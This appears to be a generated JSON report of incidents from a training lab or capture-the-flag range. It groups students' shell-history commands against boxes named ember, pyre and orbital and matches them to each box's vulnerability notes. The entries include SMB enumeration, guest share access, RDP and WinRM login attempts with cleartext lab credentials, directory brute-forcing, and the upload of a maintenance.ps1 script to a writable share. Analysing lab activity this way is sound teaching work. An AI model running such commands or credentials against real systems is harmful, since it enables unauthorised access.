@@ -1,0 +1,4157 @@
+{
+  "generated": "2026-05-12T00:03:00.176025",
+  "filtered_count": 82,
+  "incidents": [
+    {
+      "time_window": "2026-01-27T19:01:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 64,
+          "command": "nxc smb http://10.100.7.46/ u-username p-password",
+          "timestamp": "2026-01-27T19:01:55"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 309,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:01:01"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 310,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:01:13"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 311,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:01:33"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 312,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:01:46"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 313,
+          "command": "smbclient //10.100.7.46/Scripts --user guest",
+          "timestamp": "2026-01-27T19:01:50"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 314,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:01:55"
+        },
+        {
+          "log_file": "logs/10.100.7.22/shell_history.csv",
+          "line": 182,
+          "command": "nxc smb 10.100.7.46 -u [user] -p [password]",
+          "timestamp": "2026-01-27T19:01:31"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 254,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:01:10"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 255,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:01:20"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 256,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:01:43"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 257,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:01:52"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T19:05:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 320,
+          "command": "gobuster dir -u http://10.100.7.45 -w /usr/share/dirb/wordlists/common.txt",
+          "timestamp": "2026-01-27T19:05:43"
+        },
+        {
+          "log_file": "logs/10.100.7.22/shell_history.csv",
+          "line": 191,
+          "command": "nxc smb 10.100.7.45 -u guest -p \"",
+          "timestamp": "2026-01-27T19:05:12"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T19:09:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 321,
+          "command": "smbclient //10.100.7.46/Scripts --user guest",
+          "timestamp": "2026-01-27T19:09:24"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 322,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:09:58"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 268,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:09:47"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T19:10:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 323,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:10:08"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 324,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:10:17"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 269,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:10:05"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 270,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:10:14"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T19:11:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 646,
+          "command": "smbclient //10.100.7.46/Scripts --user guest",
+          "timestamp": "2026-01-27T19:11:40"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 325,
+          "command": "nmap 10.100.7.46",
+          "timestamp": "2026-01-27T19:11:01"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T19:18:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 654,
+          "command": "smbclient //10.100.7.46/Scripts --user guest",
+          "timestamp": "2026-01-27T19:18:01"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 655,
+          "command": "nxc smb 10.100.7.46 -u rand2 -p 'f?D07VdW6S$)' --shares",
+          "timestamp": "2026-01-27T19:18:04"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 334,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:18:27"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 335,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:18:44"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T19:19:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.33/shell_history.csv",
+          "line": 114,
+          "command": "nxc smb 10.100.7.46 -p '' --shares",
+          "timestamp": "2026-01-27T19:19:42"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 336,
+          "command": "nmap 10.100.7.46",
+          "timestamp": "2026-01-27T19:19:22"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T19:23:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.21/shell_history.csv",
+          "line": 95,
+          "command": "netexec smb 10.100.7.46",
+          "timestamp": "2026-01-27T19:23:42"
+        },
+        {
+          "log_file": "logs/10.100.7.33/shell_history.csv",
+          "line": 120,
+          "command": "nxc smb 10.100.7.46 -u guest -p \" --shares",
+          "timestamp": "2026-01-27T19:23:04"
+        },
+        {
+          "log_file": "logs/10.100.7.33/shell_history.csv",
+          "line": 121,
+          "command": "nxc smb 10.100.7.46 -u guest -p \" --shares",
+          "timestamp": "2026-01-27T19:23:04"
+        },
+        {
+          "log_file": "logs/10.100.7.33/shell_history.csv",
+          "line": 122,
+          "command": "smbclient //10.100.7.46/Scripts --guest",
+          "timestamp": "2026-01-27T19:23:51"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T19:35:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 689,
+          "command": "smbclient //10.100.7.46/Scripts --user guest",
+          "timestamp": "2026-01-27T19:35:40"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 357,
+          "command": "dirbuster -u 10.100.7.46 -e",
+          "timestamp": "2026-01-27T19:35:19"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-13T19:19:00",
+      "target_ip": "10.100.7.42",
+      "target_box": "orbital",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.13/shell_history.csv",
+          "line": 49,
+          "command": "evil-winrm -i 10.100.7.42 -u root",
+          "timestamp": "2026-01-13T19:19:36"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 49,
+          "command": "nxc smb 10.100.7.42 -u orbital -p securepassword",
+          "timestamp": "2026-01-13T19:19:19"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/orbital/documentation.md",
+          "matches": [
+            "base64",
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/Install-MSSQL.ps1",
+          "matches": [
+            "sql",
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/deploy.ps1",
+          "matches": [
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-13T19:54:00",
+      "target_ip": "10.100.7.42",
+      "target_box": "orbital",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.11/shell_history.csv",
+          "line": 73,
+          "command": "evil-winrm -i 10.100.7.42 -u orbital",
+          "timestamp": "2026-01-13T19:54:11"
+        },
+        {
+          "log_file": "logs/10.100.7.11/shell_history.csv",
+          "line": 74,
+          "command": "evil-winrm -i 10.100.7.42 -u orbital",
+          "timestamp": "2026-01-13T19:54:55"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 321,
+          "command": "smbclient //10.100.7.42/public --user guest",
+          "timestamp": "2026-01-13T19:54:38"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 322,
+          "command": "smbclient //10.100.7.42/public --user guest",
+          "timestamp": "2026-01-13T19:54:53"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/orbital/documentation.md",
+          "matches": [
+            "base64",
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/Install-MSSQL.ps1",
+          "matches": [
+            "sql",
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/deploy.ps1",
+          "matches": [
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-13T19:56:00",
+      "target_ip": "10.100.7.42",
+      "target_box": "orbital",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.11/shell_history.csv",
+          "line": 77,
+          "command": "evil-winrm -i 10.100.7.42 -u orbital",
+          "timestamp": "2026-01-13T19:56:00"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 326,
+          "command": "nxc smb 10.100.7.42 -u guest -p '' --shares",
+          "timestamp": "2026-01-13T19:56:49"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/orbital/documentation.md",
+          "matches": [
+            "base64",
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/Install-MSSQL.ps1",
+          "matches": [
+            "sql",
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/deploy.ps1",
+          "matches": [
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-13T19:58:00",
+      "target_ip": "10.100.7.42",
+      "target_box": "orbital",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 330,
+          "command": "nxc smb 10.100.7.42 -u guest -p ''",
+          "timestamp": "2026-01-13T19:58:28"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 331,
+          "command": "nxc smb 10.100.7.42 -u solaris -p solar-paneL321",
+          "timestamp": "2026-01-13T19:58:59"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 67,
+          "command": "xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword",
+          "timestamp": "2026-01-13T19:58:53"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 68,
+          "command": "xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword",
+          "timestamp": "2026-01-13T19:58:57"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/orbital/documentation.md",
+          "matches": [
+            "base64",
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/Install-MSSQL.ps1",
+          "matches": [
+            "sql",
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/deploy.ps1",
+          "matches": [
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-13T19:59:00",
+      "target_ip": "10.100.7.42",
+      "target_box": "orbital",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.11/shell_history.csv",
+          "line": 79,
+          "command": "evil-winrm -i 10.100.7.42 -u root",
+          "timestamp": "2026-01-13T19:59:40"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 332,
+          "command": "nxc smb 10.100.7.42 -u solaris -p solar-paneL321",
+          "timestamp": "2026-01-13T19:59:53"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 69,
+          "command": "xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword",
+          "timestamp": "2026-01-13T19:59:00"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 70,
+          "command": "xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword",
+          "timestamp": "2026-01-13T19:59:10"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/orbital/documentation.md",
+          "matches": [
+            "base64",
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/Install-MSSQL.ps1",
+          "matches": [
+            "sql",
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/deploy.ps1",
+          "matches": [
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-13T20:01:00",
+      "target_ip": "10.100.7.42",
+      "target_box": "orbital",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.11/shell_history.csv",
+          "line": 81,
+          "command": "evil-winrm -i 10.100.7.42",
+          "timestamp": "2026-01-13T20:01:40"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 342,
+          "command": "nxc smb 10.100.7.42 -u guest -X echo\"\"",
+          "timestamp": "2026-01-13T20:01:57"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/orbital/documentation.md",
+          "matches": [
+            "base64",
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/Install-MSSQL.ps1",
+          "matches": [
+            "sql",
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/deploy.ps1",
+          "matches": [
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-26T18:45:00",
+      "target_ip": "10.100.7.42",
+      "target_box": "orbital",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.11/shell_history.csv",
+          "line": 144,
+          "command": "evil-winrm -i 10.100.7.42 -u solaris",
+          "timestamp": "2026-01-26T18:45:14"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 100,
+          "command": "xfreerdp3 /u:orbital /v:10.100.7.42",
+          "timestamp": "2026-01-26T18:45:14"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 101,
+          "command": "xfreerdp3 /u:orbital /v:10.100.7.42",
+          "timestamp": "2026-01-26T18:45:27"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/orbital/documentation.md",
+          "matches": [
+            "base64",
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/Install-MSSQL.ps1",
+          "matches": [
+            "sql",
+            "git"
+          ]
+        },
+        {
+          "file": "boxes/orbital/deploy/deploy.ps1",
+          "matches": [
+            "sql",
+            "anonymous",
+            "SMB"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-26T19:23:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.11/shell_history.csv",
+          "line": 166,
+          "command": "gobuster dir -u 10.100.7.46 -w /usr/share/wordlists/dirb/big.txt",
+          "timestamp": "2026-01-26T19:23:54"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 148,
+          "command": "nxc smb 10.100.7.46 -u rand -p dFMVxYA4D! --local-auth",
+          "timestamp": "2026-01-26T19:23:58"
+        },
+        {
+          "log_file": "logs/10.100.7.31/shell_history.csv",
+          "line": 11,
+          "command": "nmap 10.100.7.46 -p 445",
+          "timestamp": "2026-01-26T19:23:21"
+        },
+        {
+          "log_file": "logs/10.100.7.31/shell_history.csv",
+          "line": 13,
+          "command": "nxc smb 10.100.7.46",
+          "timestamp": "2026-01-26T19:23:52"
+        },
+        {
+          "log_file": "logs/10.100.7.31/shell_history.csv",
+          "line": 14,
+          "command": "nxc smb 10.100.7.46",
+          "timestamp": "2026-01-26T19:23:58"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-26T19:37:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.11/shell_history.csv",
+          "line": 170,
+          "command": "gobuster dir -u 10.100.7.46 -w /usr/share/wordlists/dirb/eureka.txt",
+          "timestamp": "2026-01-26T19:37:37"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 185,
+          "command": "smbclient //10.100.7.46/Scripts -c put maintenance.ps1 maintenance.ps1\"\"",
+          "timestamp": "2026-01-26T19:37:08"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T18:52:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 630,
+          "command": "nxc smb 10.100.7.46 -u guest -p '' --users",
+          "timestamp": "2026-01-27T18:52:15"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 631,
+          "command": "nxc smb 10.100.7.46 -u guest -p '' --shares",
+          "timestamp": "2026-01-27T18:52:20"
+        },
+        {
+          "log_file": "logs/10.100.7.22/shell_history.csv",
+          "line": 174,
+          "command": "nxc smb 10.100.7.46",
+          "timestamp": "2026-01-27T18:52:50"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 233,
+          "command": "smbclient //10.100.7.46/Scripts -U \u201c\u201d",
+          "timestamp": "2026-01-27T18:52:37"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 234,
+          "command": "smbclient //10.100.7.46/Scripts -U \u201c\u201d",
+          "timestamp": "2026-01-27T18:52:43"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T18:53:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 294,
+          "command": "nmap 10.100.7.46",
+          "timestamp": "2026-01-27T18:53:27"
+        },
+        {
+          "log_file": "logs/10.100.7.22/shell_history.csv",
+          "line": 175,
+          "command": "smbclient -L //10.100.7.46",
+          "timestamp": "2026-01-27T18:53:42"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 235,
+          "command": "smbclient //10.100.7.46/Scripts -U \u201c\u201d",
+          "timestamp": "2026-01-27T18:53:40"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T19:03:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.11/shell_history.csv",
+          "line": 185,
+          "command": "nxc smb 10.100.7.46 -u EMBER$ -p J4f9juEr --shares",
+          "timestamp": "2026-01-27T19:03:16"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 636,
+          "command": "nxc smb 10.100.7.46 -u EMBER -p 'h3ab9pR32xd5A84VAGLS' --shares",
+          "timestamp": "2026-01-27T19:03:50"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 319,
+          "command": "gobuster dir -u http://10.100.7.46 -w /usr/share/dirb/wordlists/common.txt",
+          "timestamp": "2026-01-27T19:03:49"
+        },
+        {
+          "log_file": "logs/10.100.7.22/shell_history.csv",
+          "line": 184,
+          "command": "nxc smb 10.100.7.46 -u guest -p",
+          "timestamp": "2026-01-27T19:03:12"
+        },
+        {
+          "log_file": "logs/10.100.7.22/shell_history.csv",
+          "line": 185,
+          "command": "nxc smb 10.100.7.46 -u ember -p",
+          "timestamp": "2026-01-27T19:03:32"
+        },
+        {
+          "log_file": "logs/10.100.7.22/shell_history.csv",
+          "line": 186,
+          "command": "nxc smb 10.100.7.46 -u ember -p \"",
+          "timestamp": "2026-01-27T19:03:50"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 264,
+          "command": "xfreerdp3 /u:rand2 /v:10.100.7.46 /p:dFMVxYA4",
+          "timestamp": "2026-01-27T19:03:10"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 265,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4",
+          "timestamp": "2026-01-27T19:03:16"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T19:04:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 66,
+          "command": "nxc smb 10.100.7.46 -u username -p password",
+          "timestamp": "2026-01-27T19:04:28"
+        },
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 67,
+          "command": "nxc smb 10.100.7.46 -u username -p password",
+          "timestamp": "2026-01-27T19:04:41"
+        },
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 68,
+          "command": "nxc smb 10.100.7.46 -u username -p password",
+          "timestamp": "2026-01-27T19:04:41"
+        },
+        {
+          "log_file": "logs/10.100.7.34/shell_history.csv",
+          "line": 69,
+          "command": "nxc smb 10.100.7.46 -u username -p password",
+          "timestamp": "2026-01-27T19:04:41"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 637,
+          "command": "smbclient //10.100.7.46/Scripts --user guest",
+          "timestamp": "2026-01-27T19:04:03"
+        },
+        {
+          "log_file": "logs/10.100.7.22/shell_history.csv",
+          "line": 187,
+          "command": "nxc smb 10.100.7.46 -u guest -p \"",
+          "timestamp": "2026-01-27T19:04:02"
+        },
+        {
+          "log_file": "logs/10.100.7.22/shell_history.csv",
+          "line": 188,
+          "command": "ssh guest@10.100.7.46",
+          "timestamp": "2026-01-27T19:04:21"
+        },
+        {
+          "log_file": "logs/10.100.7.22/shell_history.csv",
+          "line": 189,
+          "command": "ssh guest@10.100.7.46",
+          "timestamp": "2026-01-27T19:04:26"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
